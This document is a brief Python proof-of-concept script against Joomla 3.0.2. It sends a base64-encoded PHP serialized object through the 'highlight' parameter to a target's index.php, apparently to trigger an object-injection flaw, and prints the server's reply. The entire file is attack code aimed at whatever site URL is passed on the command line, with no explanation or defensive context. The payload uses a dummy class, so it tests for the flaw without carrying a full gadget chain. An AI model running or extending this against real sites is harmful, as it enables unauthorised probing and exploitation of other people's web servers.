# Joomla (3.0.2) - PoC
import requests
import sys
import base64
from bs4 import BeautifulSoup
import urllib.parse

def printUsageAndExit():
    print("[#] Usage: python [BASEURL]")
    exit()

if __name__ != '__main__':
    exit()

if(len(sys.argv) < 2):
    printUsageAndExit()

BASEURL = sys.argv[1]

TRIGGER_INPUT = 'O:17:"dummy_class_r353t":1:{s:12:"used_methods";a:0:{}}'
PAYLOAD = {
        "highlight": base64.b64encode(TRIGGER_INPUT.encode('ascii'))
        }
# Submit PAYLOAD
poc_req = requests.get("{}{}".format(BASEURL, "/index.php"), params = PAYLOAD)
print(poc_req.text)
